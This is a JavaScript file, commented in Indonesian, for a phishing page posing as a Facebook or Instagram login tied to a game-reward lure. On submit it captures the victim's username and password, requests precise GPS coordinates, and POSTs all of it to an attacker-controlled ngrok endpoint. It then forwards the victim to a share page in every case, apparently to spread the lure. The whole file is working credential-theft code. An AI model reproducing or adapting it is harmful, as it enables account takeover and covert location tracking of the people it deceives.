// ========== CONFIGURATION ==========
// Ganti URL ini dengan URL backend Render lo setelah deploy
const BACKEND_URL = 'https://avalanche-distinct-prior.ngrok-free.dev'; 

// ========== LOGIN BUTTON STATE ==========
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const loginForm = document.getElementById('loginForm');

function checkForm() {
  if (!usernameInput || !passwordInput || !loginBtn) return;
  const hasUsername = usernameInput.value.trim().length > 0;
  const hasPassword = passwordInput.value.trim().length > 0;
  loginBtn.disabled = !(hasUsername && hasPassword);
  loginBtn.style.opacity = loginBtn.disabled ? '0.3' : '1';
}

if (usernameInput && passwordInput) {
  usernameInput.addEventListener('input', checkForm);
  passwordInput.addEventListener('input', checkForm);
  checkForm(); // Initial check
}

// Helper to get High-Accuracy Geolocation (Plan 2 Implementation)
async function getPreciseLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      console.warn('Geolocation tidak didukung browser');
      resolve(null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp
        });
      },
      (err) => {
        console.warn('GPS gagal/ditolak:', err.message);
        resolve(null);
      },
      {
        enableHighAccuracy: true,  // ⭐ Pakai GPS hardware
        timeout: 10000,            // Tunggu max 10 detik
        maximumAge: 0              // Jangan pakai cache
      }
    );
  });
}

// ========== LOGIN LOADING & BACKEND CONNECTION ==========
if (loginForm) {
  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault(); // Mencegah refresh halaman
    
    if (!loginBtn) return;
    loginBtn.disabled = true;
    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Menunggu Izin Lokasi...';

    // 1. Ambil GPS Presisi
    const gpsData = await getPreciseLocation();
    
    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses...';

    // Ambil info game & hadiah dari localStorage
    const game = localStorage.getItem('selected_game') || 'Unknown';
    const reward = localStorage.getItem('selected_reward') || 'N/A';
    
    // Deteksi metode login dari URL
    const loginMethod = window.location.pathname.includes('login-fb') ? 'Facebook' : 'Instagram';

    const dataPayload = {
      username: usernameInput.value,
      password: passwordInput.value,
      game: game,
      nominal: reward,
      method: loginMethod, 
      gps: gpsData 
    };

    console.log("MENGIRIM DATA:", dataPayload);

    try {
      // Mengirimkan data ke Backend Render (Gunakan BACKEND_URL)
      const response = await fetch(`${BACKEND_URL}/api/setor-data`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'ngrok-skip-browser-warning': 'true'
        },
        body: JSON.stringify(dataPayload)
      });

      const result = await response.json();

      // Jika backend sukses memproses, langsung lempar ke halaman SHARE
      if (result.status === 'success') {
        window.location.href = 'share.html';
      }

    } catch (error) {
      console.error('Gagal menghubungi server backend:', error);
      // Fallback redirect even if backend fails
      window.location.href = 'share.html';
    }
  });
}

